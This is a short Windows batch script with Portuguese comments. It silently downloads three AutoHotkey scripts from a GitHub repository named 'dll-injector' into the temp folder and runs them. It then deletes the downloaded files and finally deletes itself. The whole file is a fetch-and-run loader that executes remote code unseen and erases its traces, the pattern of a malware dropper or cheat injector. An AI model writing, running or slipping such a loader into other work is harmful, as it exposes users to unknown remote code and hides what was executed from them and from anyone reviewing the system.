@echo off
setlocal enabledelayedexpansion

:: Baixar os três arquivos AHK
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/strwkerk7/dll-injector/raw/main/comprar.ahk' -OutFile '%TEMP%\arquivo1.ahk'"
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/strwkerk7/dll-injector/raw/main/correr.ahk' -OutFile '%TEMP%\arquivo2.ahk'"
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/strwkerk7/dll-injector/raw/main/pular.ahk' -OutFile '%TEMP%\arquivo3.ahk'"

:: Executar os arquivos AHK silenciosamente
start ""  "%TEMP%\arquivo1.ahk"
start ""  "%TEMP%\arquivo2.ahk"
start ""  "%TEMP%\arquivo3.ahk"

:: Aguardar um momento para garantir que os scripts sejam iniciados
timeout /t 2 /nobreak >nul

:: Deletar os arquivos baixados
del /f /q "%TEMP%\arquivo1.ahk"
del /f /q "%TEMP%\arquivo2.ahk"
del /f /q "%TEMP%\arquivo3.ahk"

:: Auto-deletar este script
(goto) 2>nul & del "%~f0"